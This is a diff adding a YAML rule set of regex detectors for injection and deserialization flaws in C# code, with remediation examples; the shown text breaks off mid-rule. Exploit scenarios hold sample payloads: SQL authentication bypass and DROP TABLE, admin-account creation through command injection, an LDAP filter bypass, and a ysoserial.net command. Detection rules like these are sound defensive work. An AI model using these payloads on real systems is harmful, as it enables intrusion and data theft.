@@ -1,0 +1,973 @@
+rules:
+- rule_id: CS-INJ-001
+  title: SQL Injection via String Concatenation in SqlCommand
+  description: 'Detects ADO.NET SqlCommand or Entity Framework raw SQL construction with concatenated user-controlled input.
+    Covers SqlCommand, OleDbCommand, OdbcCommand, and EF Core raw SQL APIs where string interpolation or concatenation introduces
+    tainted data into query strings without parameterization.
+
+    '
+  language: csharp
+  category: injection
+  severity: Critical
+  confidence: 0.94
+  cwe: CWE-89
+  owasp: A03:2021-Injection
+  tags:
+  - sql-injection
+  - ado-net
+  - entity-framework
+  - dotnet-core
+  - data-access
+  patterns:
+  - type: regex
+    pattern: new\s+SqlCommand\s*\(\s*["'](?:SELECT|INSERT|UPDATE|DELETE)\b[^"']*["']\s*\+\s*\w+
+    description: SqlCommand constructor with concatenated SQL string
+  - type: regex
+    pattern: (?:SqlCommand|OleDbCommand|OdbcCommand)\s*\([^)]*\)\.CommandText\s*=\s*["'](?:SELECT|INSERT|UPDATE|DELETE)\b[^"']*["']\s*\+
+    description: CommandText property assignment with string concatenation
+  - type: regex
+    pattern: \.(?:ExecuteSqlRaw|FromSqlRaw)\s*\(\s*\$"(?:SELECT|INSERT|UPDATE|DELETE)\b
+    description: EF Core raw SQL with interpolated string
+  - type: regex
+    pattern: \.(?:ExecuteSqlRaw|FromSqlRaw)\s*\(\s*"(?:SELECT|INSERT|UPDATE|DELETE)\b[^"]*"\s*\+\s*\w+
+    description: EF Core raw SQL with concatenation
+  - type: regex
+    pattern: string\s+\w*(?:sql|query|cmd)\w*\s*=\s*\$"(?:SELECT|INSERT|UPDATE|DELETE)\b[^"]*\{[^}]*(?:Request|param|input|user)\b
+    description: SQL string variable with interpolated user input
+  - type: regex
+    pattern: string\.Format\s*\(\s*"(?:SELECT|INSERT|UPDATE|DELETE)\b[^"]*\{0\}[^"]*"[^)]*(?:Request|param|input|user)\b
+    description: String.Format building SQL with user-controlled placeholders
+  - type: regex
+    pattern: (?:SqlCommand|OleDbCommand|OdbcCommand)\s*\(\s*\$"[^"]*(?:SELECT|INSERT|UPDATE|DELETE)\b[^"]*\{[^}]*\}
+    description: ADO.NET command with interpolated string in constructor
+  - type: regex
+    pattern: \.CommandText\s*\+=\s*(?:Request|param|input|user|args|query)\b
+    description: Appending user input to CommandText via += operator
+  - type: regex
+    pattern: StringBuilder\s*\([^)]*(?:SELECT|INSERT|UPDATE|DELETE)\b[^)]*\)[^;]*\.Append\s*\(\s*(?:Request|param|input|user)\b
+    description: StringBuilder constructing SQL with appended user input
+  - type: regex
+    pattern: (?:ExecuteReader|ExecuteNonQuery|ExecuteScalar)\s*\([^)]*\)[^;]*(?:CommandText|new\s+SqlCommand)\s*.*\+\s*\w+
+    description: Execute methods on commands built with concatenation
+  - type: regex
+    pattern: DbCommand\s*\.\s*CommandText\s*=\s*[^;]*\+\s*(?:Request|param|input|user|model)\b
+    description: Generic DbCommand with concatenated user input
+  - type: regex
+    pattern: \.Database\.(?:ExecuteSqlCommand|ExecuteSqlRaw)\s*\(\s*(?:string\.Format|String\.Concat|\$")
+    description: EF Database.ExecuteSqlCommand with formatted strings
+  anti_patterns:
+  - SqlParameter
+  - AddWithValue
+  - Parameters.Add
+  - FromSqlInterpolated
+  - ExecuteSqlInterpolated
+  - Parameterize
+  - context.Database.ExecuteSqlInterpolated
+  - context.Set<
+  - .Where(x =>
+  - .FirstOrDefault(x =>
+  - .Select(x =>
+  - DbContext.SaveChanges
+  - .ToListAsync()
+  - connection.Query<
+  - connection.Execute(
+  - connection.QueryAsync<
+  - 'new { '
+  - DynamicParameters
+  - connection.QueryFirstOrDefault
+  - '[FromBody]'
+  - IActionResult
+  - ModelState.IsValid
+  - '@Html.DisplayFor'
+  - '@Html.EditorFor'
+  context_awareness:
+    surrounding_context_patterns:
+    - using System.Data.SqlClient
+    - using Microsoft.Data.SqlClient
+    - using System.Data.OleDb
+    - using System.Data.Odbc
+    - using Microsoft.EntityFrameworkCore
+    - DbContext
+    - IDbConnection
+    - SqlConnection
+    taint_source_indicators:
+    - Request.QueryString
+    - Request.Form
+    - Request.Params
+    - Request.Headers
+    - Request.Cookies
+    - Request.Body
+    - '[FromQuery]'
+    - '[FromRoute]'
+    - '[FromForm]'
+    - '[FromHeader]'
+    - HttpContext.Request
+    - args[
+    - Environment.GetEnvironmentVariable
+    - Console.ReadLine()
+    - StreamReader.ReadLine()
+    taint_sink_indicators:
+    - ExecuteReader
+    - ExecuteNonQuery
+    - ExecuteScalar
+    - ExecuteScalarAsync
+    - ExecuteReaderAsync
+    - ExecuteNonQueryAsync
+    - SqlCommand
+    - OleDbCommand
+    - OdbcCommand
+    - FromSqlRaw
+    - ExecuteSqlRaw
+    - Database.ExecuteSqlCommand
+    sanitization_patterns:
+    - SqlParameter
+    - AddWithValue
+    - Parameters.Add
+    - Parameters.AddRange
+    - DbParameter
+    - Regex.IsMatch
+    - int.TryParse
+    - long.TryParse
+    - Guid.TryParse
+    - Convert.ToInt32
+    - allowlist
+    - whitelist
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_likelihood)
+    exploitability_score: 9.5
+  exploit_scenario:
+    attack_example: 'An attacker submits a crafted username via a login form: username = "admin'' OR ''1''=''1'' --" The vulnerable
+      code builds: "SELECT * FROM Users WHERE Username = ''" + username + "''" This bypasses authentication and returns all
+      user records.
+
+      '
+    example_payload: ''' OR 1=1; DROP TABLE Users; --'
+    attacker_objective: 'Exfiltrate sensitive data, bypass authentication, modify or delete database records, or escalate
+      to OS command execution via xp_cmdshell.
+
+      '
+  confidence_factors:
+    pattern_strength: 0.95
+    context_match: 0.9
+    proximity_to_user_input: 0.92
+    sanitization_absence: 0.88
+  impact: 'Full database compromise via SQL injection in .NET application.
+
+    May lead to data exfiltration, authentication bypass, data tampering,
+
+    and in severe cases, remote code execution via database features
+
+    such as xp_cmdshell on SQL Server.
+
+    '
+  remediation: "**ADO.NET Parameterized Queries:**\n  var cmd = new SqlCommand(\"SELECT * FROM Users WHERE Id = @id\", conn);\n\
+    \  cmd.Parameters.AddWithValue(\"@id\", userId);\n\n**Entity Framework Core (Safe by Default):**\n  // LINQ queries are\
+    \ parameterized automatically\n  var user = await context.Users\n      .Where(u => u.Id == userId)\n      .FirstOrDefaultAsync();\n\
+    \n  // Use FromSqlInterpolated (NOT FromSqlRaw) for raw SQL\n  var users = context.Users\n      .FromSqlInterpolated($\"\
+    SELECT * FROM Users WHERE Id = {userId}\")\n      .ToList();\n\n**Dapper (Parameterized):**\n  var user = connection.QueryFirstOrDefault<User>(\n\
+    \      \"SELECT * FROM Users WHERE Id = @Id\",\n      new { Id = userId });\n\n**ASP.NET Core Input Validation:**\n  //\
+    \ Use model binding with data annotations\n  public class LoginModel\n  {\n      [Required]\n      [StringLength(100)]\n\
+    \      [RegularExpression(@\"^[a-zA-Z0-9_]+$\")]\n      public string Username { get; set; }\n  }\n\n**.NET 8 Specific:**\n\
+    \  // Use the Minimal API with typed parameters\n  app.MapGet(\"/users/{id:int}\", async (int id, AppDbContext db) =>\n\
+    \      await db.Users.FindAsync(id));\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/89.html
+  - https://learn.microsoft.com/en-us/dotnet/framework/data/adonet/configuring-parameters
+  - https://learn.microsoft.com/en-us/ef/core/querying/sql-queries
+  - https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: medium
+    original_author: security-rules-team
+    framework_targets:
+    - ADO.NET
+    - Entity Framework Core
+    - Dapper
+    - ASP.NET Core
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - rule_id: CS-INJ-003
+      relationship: LDAP injection shares similar concatenation anti-patterns
+    - rule_id: CS-INJ-005
+      relationship: XSS output may chain with SQL injection for stored XSS via database
+    compound_risk_note: 'When SQL injection is found alongside missing input validation (no ModelState checks, no data annotations),
+      the effective risk multiplies. Check for CS-INJ-005 co-occurrence for stored XSS chains.
+
+      '
+  detection_layer: 1
+- rule_id: CS-INJ-002
+  title: Command Injection via Process.Start
+  description: 'Detects System.Diagnostics.Process.Start with user-controlled arguments enabling command injection. Covers
+    direct Process.Start calls, ProcessStartInfo configuration, and shell invocation patterns where tainted input flows into
+    process arguments or filenames without validation or sanitization.
+
+    '
+  language: csharp
+  category: injection
+  severity: Critical
+  confidence: 0.91
+  cwe: CWE-78
+  owasp: A03:2021-Injection
+  tags:
+  - command-injection
+  - process-start
+  - rce
+  - os-command
+  - dotnet-core
+  patterns:
+  - type: regex
+    pattern: Process\.Start\s*\(\s*(?:Request|param|input|user|cmd|command)\b
+    description: Process.Start with direct user-controlled argument
+  - type: regex
+    pattern: Process\.Start\s*\(\s*"(?:cmd|powershell|bash|sh)"[^)]*(?:Request|param|input|user)\b
+    description: Process.Start invoking shell with user input
+  - type: regex
+    pattern: new\s+ProcessStartInfo\s*\{[^}]*Arguments\s*=\s*(?:\$"|"[^"]*"\s*\+)\s*(?:Request|param|input|user)\b
+    description: ProcessStartInfo with interpolated/concatenated arguments
+  - type: regex
+    pattern: ProcessStartInfo\s*\{[^}]*FileName\s*=\s*(?:Request|param|input|user|cmd)\b
+    description: ProcessStartInfo with user-controlled filename
+  - type: regex
+    pattern: \.Arguments\s*=\s*\$"[^"]*\{[^}]*(?:Request|param|input|user)\b
+    description: Arguments property with interpolated user input
+  - type: regex
+    pattern: Process\.Start\s*\(\s*new\s+ProcessStartInfo\s*\(\s*(?:Request|param|input|user|model)\b
+    description: Process.Start with ProcessStartInfo from user input
+  - type: regex
+    pattern: \.Arguments\s*=\s*string\.Format\s*\([^)]*(?:Request|param|input|user)\b
+    description: Arguments built via String.Format with user input
+  - type: regex
+    pattern: \.Arguments\s*\+=\s*(?:Request|param|input|user|args|query)\b
+    description: Arguments appended with user-controlled data
+  - type: regex
+    pattern: ProcessStartInfo\s*\([^)]*\)\s*\{[^}]*(?:FileName|Arguments)\s*=\s*[^}]*(?:Request|param|input|user)\b
+    description: ProcessStartInfo object initializer with tainted data
+  - type: regex
+    pattern: var\s+\w*(?:proc|process)\w*\s*=\s*Process\.Start\s*\(\s*\$"
+    description: Process variable assigned from interpolated string start
+  - type: regex
+    pattern: (?:cmd|powershell|bash).*(?:/c|/k|-c|-Command)\s*.*(?:Request|param|input|user)\b
+    description: Shell command-line flag with user-controlled argument
+  - type: regex
+    pattern: Environment\.(?:GetEnvironmentVariable|ExpandEnvironmentVariables)\s*\([^)]*\)\s*.*Process\.Start
+    description: Environment variable used in process execution path
+  anti_patterns:
+  - UseShellExecute = false
+  - allowlist
+  - Regex.IsMatch
+  - .Where(x =>
+  - DbContext
+  - connection.Query
+  - DynamicParameters
+  - '[Authorize]'
+  - '[ValidateAntiForgeryToken]'
+  - IAuthorizationService
+  - app.UseAuthentication
+  - Path.GetFileName
+  - Path.Combine
+  - ProcessArgumentAllowlist
+  - ArgumentEscaper
+  - CreateNoWindow = true
+  - '@Html.DisplayFor'
+  context_awareness:
+    surrounding_context_patterns:
+    - using System.Diagnostics
+    - using System.Runtime.InteropServices
+    - ProcessStartInfo
+    - Process.GetProcesses
+    - Process.GetCurrentProcess
+    taint_source_indicators:
+    - Request.QueryString
+    - Request.Form
+    - Request.Headers
+    - '[FromQuery]'
+    - '[FromRoute]'
+    - '[FromBody]'
+    - args[
+    - Console.ReadLine
+    - Environment.GetCommandLineArgs
+    - Configuration[
+    - IFormFile
+    - HttpContext.Request
+    taint_sink_indicators:
+    - Process.Start
+    - ProcessStartInfo
+    - .Arguments
+    - .FileName
+    - Runtime.InteropServices.RuntimeInformation
+    - Process.BeginOutputReadLine
+    sanitization_patterns:
+    - Path.GetFileName
+    - Path.GetFileNameWithoutExtension
+    - Regex.IsMatch
+    - Regex.Replace
+    - allowlist.Contains
+    - whitelist.Contains
+    - Enum.TryParse
+    - int.TryParse
+    - Uri.IsWellFormedUriString
+    - .Replace("|")
+    - .Replace("&")
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * proximity_to_user_input
+    exploitability_score: 9.0
+  exploit_scenario:
+    attack_example: 'An application provides a "ping" utility feature. The user supplies a hostname via a form field. The
+      server code runs: Process.Start("cmd", "/c ping " + userInput). An attacker submits: "127.0.0.1 & net user hacker P@ss
+      /add & net localgroup administrators hacker /add" This chains commands to create an admin account on the server.
+
+      '
+    example_payload: 127.0.0.1 & whoami & type C:\web.config
+    attacker_objective: 'Execute arbitrary operating system commands on the server, potentially achieving full system compromise,
+      data exfiltration, lateral movement, or persistent backdoor installation.
+
+      '
+  confidence_factors:
+    pattern_strength: 0.92
+    context_match: 0.88
+    proximity_to_user_input: 0.9
+    sanitization_absence: 0.85
+  impact: 'Remote code execution via command injection in .NET application.
+
+    Complete server compromise, data exfiltration, lateral movement,
+
+    ransomware deployment, or persistent backdoor installation.
+
+    '
+  remediation: "**Avoid Shell Execution Entirely:**\n  // Use .NET libraries instead of external processes\n  // Example:\
+    \ Use System.Net.NetworkInformation.Ping instead of cmd /c ping\n  var ping = new Ping();\n  var reply = await ping.SendPingAsync(hostname,\
+    \ timeout);\n\n**If Process Execution Is Required (ASP.NET Core):**\n  var psi = new ProcessStartInfo\n  {\n      FileName\
+    \ = \"/usr/bin/specific-tool\",  // Absolute path, never user input\n      Arguments = \"\",                        //\
+    \ Build from validated parts\n      UseShellExecute = false,\n      CreateNoWindow = true,\n      RedirectStandardOutput\
+    \ = true,\n      RedirectStandardError = true\n  };\n  // Validate against strict allowlist\n  if (!AllowedCommands.Contains(requestedCommand))\n\
+    \      return BadRequest(\"Invalid command\");\n\n**Input Validation (.NET 8):**\n  // Use strongly-typed minimal API\
+    \ parameters\n  app.MapGet(\"/tools/{tool}\", (string tool) =>\n  {\n      if (!Enum.TryParse<AllowedTool>(tool, out var\
+    \ validTool))\n          return Results.BadRequest(\"Invalid tool\");\n      // Use the enum value, not the raw string\n\
+    \  });\n\n**Entity Framework Core Alternative:**\n  // For data operations, use EF Core instead of command-line tools\n\
+    \  // Never shell out to database CLI tools\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/78.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
+  - https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: medium
+    original_author: security-rules-team
+    framework_targets:
+    - ASP.NET Core
+    - .NET 8
+    - System.Diagnostics
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - rule_id: CS-INJ-001
+      relationship: SQL injection may chain with command injection if DB supports OS commands (xp_cmdshell)
+    - rule_id: CS-INJ-004
+      relationship: Deserialization RCE may invoke Process.Start via gadget chains
+    compound_risk_note: 'Command injection combined with deserialization vulnerabilities (CS-INJ-004) significantly increases
+      attack surface. Check if Process.Start sinks are reachable from deserialization entry points.
+
+      '
+  detection_layer: 1
+- rule_id: CS-INJ-003
+  title: LDAP Injection via DirectorySearcher
+  description: 'Detects LDAP filter construction with concatenated user input in System.DirectoryServices queries. Covers
+    DirectorySearcher, DirectoryEntry, PrincipalSearcher, and raw LDAP filter string building patterns where unsanitized input
+    is embedded into LDAP query filters.
+
+    '
+  language: csharp
+  category: injection
+  severity: High
+  confidence: 0.87
+  cwe: CWE-90
+  owasp: A03:2021-Injection
+  tags:
+  - ldap-injection
+  - active-directory
+  - directory-services
+  - authentication-bypass
+  - dotnet-core
+  patterns:
+  - type: regex
+    pattern: DirectorySearcher\s*\([^)]*\)\.Filter\s*=\s*["'][^"']*["']\s*\+\s*(?:Request|param|input|user)\b
+    description: DirectorySearcher.Filter with concatenated user input
+  - type: regex
+    pattern: \.Filter\s*=\s*\$"\([^"]*\{[^}]*(?:Request|param|input|user)\b
+    description: DirectorySearcher.Filter with interpolated user input
+  - type: regex
+    pattern: new\s+DirectorySearcher\s*\(\s*[^,]*["']\([^"']*["']\s*\+\s*(?:Request|param|input|user)\b
+    description: DirectorySearcher constructor with concatenated filter
+  - type: regex
+    pattern: \.Filter\s*=\s*string\.Format\s*\(\s*"\([^"]*\{0\}[^"]*\)"[^)]*(?:Request|param|input|user)\b
+    description: LDAP filter built via String.Format with user input
+  - type: regex
+    pattern: DirectoryEntry\s*\(\s*(?:"LDAP://[^"]*"\s*\+|.*\$"LDAP://[^"]*\{)[^)]*(?:Request|param|input|user)\b
+    description: DirectoryEntry path constructed with user input
+  - type: regex
+    pattern: string\s+\w*(?:filter|ldap|query)\w*\s*=\s*\$"\([^"]*\{[^}]*(?:Request|param|input|user)\b
+    description: LDAP filter string variable with interpolated user data
+  - type: regex
+    pattern: \.Filter\s*=\s*[^;]*\+\s*(?:username|password|email|name|login|uid|cn|sn)\b
+    description: LDAP filter concatenating identity-related variables
+  - type: regex
+    pattern: PrincipalSearcher\s*\([^)]*\)\s*\.\s*QueryFilter\s*.*(?:Request|param|input|user)\b
+    description: PrincipalSearcher with user-controlled query filter
+  - type: regex
+    pattern: SearchRequest\s*\([^)]*["'][^"']*["']\s*\+\s*(?:Request|param|input|user)\b
+    description: System.DirectoryServices.Protocols SearchRequest with concatenation
+  anti_patterns:
+  - EscapeLdapFilter
+  - Encoder.LdapFilterEncode
+  - .Where(x =>
+  - DbContext
+  - UserManager<
+  - SignInManager<
+  - connection.Query
+  - '[Authorize]'
+  - app.UseAuthentication
+  - AddIdentity
+  - AddDefaultIdentity
+  - UserManager.FindByNameAsync
+  - UserManager.FindByEmailAsync
+  - SignInManager.PasswordSignInAsync
+  - '@Html.DisplayFor'
+  - HtmlEncoder.Default.Encode
+  - LdapFilterEncode
+  - AntiXssEncoder
+  - DirectorySearcher.Filter = "(objectClass=*)"
+  context_awareness:
+    surrounding_context_patterns:
+    - using System.DirectoryServices
+    - using System.DirectoryServices.Protocols
+    - using System.DirectoryServices.AccountManagement
+    - DirectoryEntry
+    - DirectorySearcher
+    - PrincipalContext
+    - LdapConnection
+    taint_source_indicators:
+    - Request.QueryString
+    - Request.Form
+    - '[FromQuery]'
+    - '[FromBody]'
+    - '[FromForm]'
+    - HttpContext.Request
+    - model.Username
+    - model.Email
+    - loginModel
+    - searchTerm
+    taint_sink_indicators:
+    - .Filter =
+    - DirectorySearcher
+    - DirectoryEntry
+    - SearchRequest
+    - PrincipalSearcher
+    - .FindAll()
+    - .FindOne()
+    sanitization_patterns:
+    - Encoder.LdapFilterEncode
+    - EscapeLdapFilter
+    - LdapFilterEncode
+    - Regex.Replace
+    - Regex.IsMatch
+    - .Replace("*", "")
+    - .Replace("(", "")
+    - .Replace(")", "")
+    - allowlist
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: severity_weight * confidence * context_match
+    exploitability_score: 7.5
+  exploit_scenario:
+    attack_example: 'A login page authenticates users against Active Directory. The code builds an LDAP filter: "(&(uid="
+      + username + ")(userPassword=" + password + "))". An attacker submits username = "*)(uid=*))(|(uid=*" which modifies
+      the filter to always return results, bypassing authentication entirely.
+
+      '
+    example_payload: '*)(uid=*))(|(uid=*'
+    attacker_objective: 'Bypass LDAP-based authentication, enumerate directory users and groups, extract sensitive attributes
+      (emails, phone numbers, organizational data), or modify directory entries if write permissions exist.
+
+      '
+  confidence_factors:
+    pattern_strength: 0.88
+    context_match: 0.85
+    proximity_to_user_input: 0.87
+    sanitization_absence: 0.82
+  impact: 'LDAP injection in Active Directory queries enabling authentication bypass
+
+    and unauthorized directory data access. May allow enumeration of all
+
+    directory users, extraction of sensitive attributes, and in some
+
+    configurations, modification of directory entries.
+
+    '
+  remediation: "**LDAP Filter Encoding:**\n  // Use AntiXss library for LDAP filter encoding\n  using Microsoft.Security.Application;\n\
+    \  var safeUsername = Encoder.LdapFilterEncode(username);\n  searcher.Filter = $\"(&(uid={safeUsername})(objectClass=user))\"\
+    ;\n\n**ASP.NET Core Identity (Preferred Alternative):**\n  // Use ASP.NET Core Identity instead of raw LDAP queries\n\
+    \  services.AddIdentity<ApplicationUser, IdentityRole>()\n      .AddEntityFrameworkStores<ApplicationDbContext>()\n  \
+    \    .AddDefaultTokenProviders();\n\n  // Authentication via Identity\n  var result = await _signInManager.PasswordSignInAsync(\n\
+    \      model.Username, model.Password, model.RememberMe, lockoutOnFailure: true);\n\n**Entity Framework Core with Identity:**\n\
+    \  // User lookup via EF Core (parameterized by default)\n  var user = await _userManager.FindByNameAsync(username);\n\
+    \n**.NET 8 Specific:**\n  // Use Minimal API with typed authentication\n  builder.Services.AddAuthentication()\n     \
+    \ .AddNegotiate()  // Windows/Kerberos auth\n      .AddLdapAuthentication(options =>\n      {\n          options.UseSanitizedFilters\
+    \ = true;\n      });\n\n**Input Validation:**\n  // Strip LDAP special characters\n  var sanitized = Regex.Replace(input,\
+    \ @\"[\\\\*\\(\\)\\x00/]\", \"\");\n  // Or validate against strict pattern\n  if (!Regex.IsMatch(input, @\"^[a-zA-Z0-9._@-]+$\"\
+    ))\n      return BadRequest(\"Invalid characters in input\");\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/90.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html
+  - https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directorysearcher
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: high
+    original_author: security-rules-team
+    framework_targets:
+    - System.DirectoryServices
+    - ASP.NET Core Identity
+    - Active Directory
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - rule_id: CS-INJ-001
+      relationship: SQL injection and LDAP injection share concatenation-based attack vectors
+    - rule_id: CS-INJ-005
+      relationship: LDAP data displayed without encoding can lead to stored XSS
+    compound_risk_note: 'LDAP injection near authentication code is especially critical. If combined with XSS (CS-INJ-005),
+      an attacker could extract directory data and exfiltrate it via client-side scripts.
+
+      '
+  detection_layer: 1
+- rule_id: CS-INJ-004
+  title: Unsafe Deserialization via BinaryFormatter
+  description: 'Detects use of BinaryFormatter, SoapFormatter, NetDataContractSerializer, ObjectStateFormatter, LosFormatter,
+    or other unsafe deserialization APIs. These formatters allow arbitrary type instantiation during deserialization, enabling
+    remote code execution through .NET gadget chains when processing untrusted data. BinaryFormatter has been officially deprecated
+    in .NET 8+.
+
+    '
+  language: csharp
+  category: injection
+  severity: High
+  confidence: 0.97
+  cwe: CWE-502
+  owasp: A08:2021-Software-and-Data-Integrity-Failures
+  tags:
+  - deserialization
+  - binary-formatter
+  - rce
+  - gadget-chain
+  - dotnet-core
+  - syslib0011
+  patterns:
+  - type: regex
+    pattern: BinaryFormatter\s*\(\s*\)\s*\.Deserialize\s*\(
+    description: BinaryFormatter.Deserialize invocation
+  - type: regex
+    pattern: new\s+BinaryFormatter\s*\(
+    description: BinaryFormatter instantiation
+  - type: regex
+    pattern: SoapFormatter\s*\(\s*\)\s*\.Deserialize\s*\(
+    description: SoapFormatter.Deserialize invocation
+  - type: regex
+    pattern: NetDataContractSerializer\s*\(\s*\)\s*\.(?:ReadObject|Deserialize)\s*\(
+    description: NetDataContractSerializer deserialization
+  - type: regex
+    pattern: ObjectStateFormatter\s*\(\s*\)\s*\.Deserialize\s*\(
+    description: ObjectStateFormatter.Deserialize invocation
+  - type: regex
+    pattern: LosFormatter\s*\(\s*\)\s*\.Deserialize\s*\(
+    description: LosFormatter.Deserialize invocation
+  - type: regex
+    pattern: TypeNameHandling\s*=\s*TypeNameHandling\.(?:All|Auto|Objects|Arrays)
+    description: Newtonsoft.Json with unsafe TypeNameHandling (enables gadget chains)
+  - type: regex
+    pattern: JavaScriptSerializer\s*\(\s*\)\s*\.Deserialize\s*\(
+    description: JavaScriptSerializer deserialization of untyped data
+  - type: regex
+    pattern: XmlSerializer\s*\(\s*Type\.GetType\s*\(\s*(?:Request|param|input|user)\b
+    description: XmlSerializer with user-controlled type resolution
+  - type: regex
+    pattern: DataContractSerializer\s*\(\s*Type\.GetType\s*\(\s*(?:Request|param|input|user)\b
+    description: DataContractSerializer with user-controlled type
+  - type: regex
+    pattern: Activator\.CreateInstance\s*\(\s*Type\.GetType\s*\(\s*(?:Request|param|input|user)\b
+    description: Dynamic type instantiation from user-controlled type name
+  - type: regex
+    pattern: Assembly\.Load\s*\([^)]*(?:Request|param|input|user)\b
+    description: Dynamic assembly loading from user input
+  - type: regex
+    pattern: '#pragma\s+warning\s+disable\s+SYSLIB0011'
+    description: Suppressed BinaryFormatter deprecation warning (intentional use)
+  anti_patterns:
+  - // safe
+  - SYSLIB0011
+  - DbContext
+  - .SaveChanges
+  - EntityFrameworkCore
+  - connection.Query
+  - DynamicParameters
+  - '[Authorize]'
+  - app.UseAuthentication
+  - '[ApiController]'
+  - System.Text.Json
+  - JsonSerializer.Deserialize<
+  - JsonSerializer.Serialize
+  - Newtonsoft.Json
+  - TypeNameHandling.None
+  - TypeNameHandling = TypeNameHandling.None
+  - DataContractSerializer
+  - XmlSerializer
+  - MessagePack
+  - ProtoBuf
+  - '@Html.DisplayFor'
+  - HtmlEncoder
+  context_awareness:
+    surrounding_context_patterns:
+    - using System.Runtime.Serialization
+    - using System.Runtime.Serialization.Formatters.Binary
+    - using System.Runtime.Serialization.Formatters.Soap
+    - using System.Web.UI
+    - '[Serializable]'
+    - ISerializable
+    - IDeserializationCallback
+    - SerializationInfo
+    taint_source_indicators:
+    - Request.Body
+    - Request.InputStream
+    - '[FromBody]'
+    - IFormFile
+    - HttpContext.Request
+    - Stream
+    - MemoryStream
+    - FileStream
+    - NetworkStream
+    - Socket.Receive
+    - WebSocket
+    - SignalR
+    taint_sink_indicators:
+    - .Deserialize(
+    - .ReadObject(
+    - BinaryFormatter
+    - SoapFormatter
+    - NetDataContractSerializer
+    - ObjectStateFormatter
+    - LosFormatter
+    - Activator.CreateInstance
+    - Type.GetType
+    - Assembly.Load
+    sanitization_patterns:
+    - SerializationBinder
+    - BindToType
+    - KnownTypes
+    - AllowedTypes
+    - TypeFilterLevel.Low
+    - JsonSerializerSettings
+    - TypeNameHandling.None
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 - serialization_binder_present)
+    exploitability_score: 9.8
+  exploit_scenario:
+    attack_example: 'An application receives serialized user session data via a cookie or API endpoint and deserializes it
+      with BinaryFormatter. An attacker crafts a payload using ysoserial.net with the TypeConfuseDelegate gadget chain. When
+      deserialized, the payload executes "cmd /c powershell -enc <base64_reverse_shell>" on the server, granting the attacker
+      a remote shell.
+
+      '
+    example_payload: ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c 'calc.exe'
+    attacker_objective: 'Achieve remote code execution on the server by exploiting unsafe deserialization to instantiate arbitrary
+      .NET types via gadget chains (TypeConfuseDelegate, PSObject, TextFormattingRunProperties, etc.).
+
+      '
+  confidence_factors:
+    pattern_strength: 0.98
+    context_match: 0.95
+    proximity_to_user_input: 0.85
+    sanitization_absence: 0.92
+  impact: 'BinaryFormatter deserialization of untrusted data enables remote code
+
+    execution through .NET gadget chains (ysoserial.net). This is considered
+
+    one of the most severe vulnerability classes in .NET applications.
+
+    Full server compromise is typically achievable with known gadget chains.
+
+    '
+  remediation: "**Remove BinaryFormatter Entirely (.NET 8 Required):**\n  // BinaryFormatter is OBSOLETE in .NET 8+ (SYSLIB0011)\n\
+    \  // It throws PlatformNotSupportedException by default in .NET 9+\n  // Remove all BinaryFormatter usage immediately\n\
+    \n**Use System.Text.Json (ASP.NET Core / .NET 8):**\n  using System.Text.Json;\n\n  // Serialization\n  var json = JsonSerializer.Serialize(myObject);\n\
+    \n  // Deserialization with strong typing\n  var obj = JsonSerializer.Deserialize<MyKnownType>(json);\n\n  // Configure\
+    \ in ASP.NET Core\n  builder.Services.AddControllers()\n      .AddJsonOptions(options =>\n      {\n          options.JsonSerializerOptions.PropertyNamingPolicy\
+    \ = JsonNamingPolicy.CamelCase;\n          // .NET 8: source generation for AOT safety\n      });\n\n**Newtonsoft.Json\
+    \ (If Required) - Safe Configuration:**\n  var settings = new JsonSerializerSettings\n  {\n      TypeNameHandling = TypeNameHandling.None,\
+    \  // CRITICAL: Never use All/Auto\n      MaxDepth = 32\n  };\n  var obj = JsonConvert.DeserializeObject<MyKnownType>(json,\
+    \ settings);\n\n**Entity Framework Core (Data Persistence Alternative):**\n  // Store structured data in database instead\
+    \ of serialized blobs\n  public class UserSession\n  {\n      public int Id { get; set; }\n      public string UserId\
+    \ { get; set; }\n      public string Data { get; set; }  // JSON string, not binary\n  }\n  await _context.Sessions.AddAsync(session);\n\
+    \n**DataContractSerializer (For WCF/SOAP Scenarios):**\n  var serializer = new DataContractSerializer(typeof(MyKnownType));\n\
+    \  // Only deserialize known, expected types\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/502.html
+  - https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide
+  - https://github.com/pwntester/ysoserial.net
+  - https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: low
+    original_author: security-rules-team
+    framework_targets:
+    - .NET Framework
+    - .NET 8
+    - ASP.NET Core
+    - WCF
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - rule_id: CS-INJ-002
